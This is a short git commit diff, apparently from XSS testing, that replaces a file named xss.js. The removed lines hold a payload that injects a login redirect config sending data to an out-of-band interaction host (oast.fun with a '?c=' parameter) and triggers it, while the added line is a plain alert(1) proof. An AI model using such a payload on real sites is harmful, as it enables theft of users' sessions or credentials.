96a6bd8aaf06395a0db942a2d6886c1f600e3e10
ineedabetterh4ndl3 <139599187+uhavebeenpwned@users.noreply.github.com>
2026-03-19 19:12:19 +0000

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,8 +1,1 @@
-// xss.js hosted on your github
-window.authConfig = {
-    dataset: {
-        next: "https://ehexvgcthhdlxzxhgsvvnu3zjinpn36ty.oast.fun/?c=",
-        append: "true"
-    }
-};
-window.Auth.loginRedirect();
+alert(1);
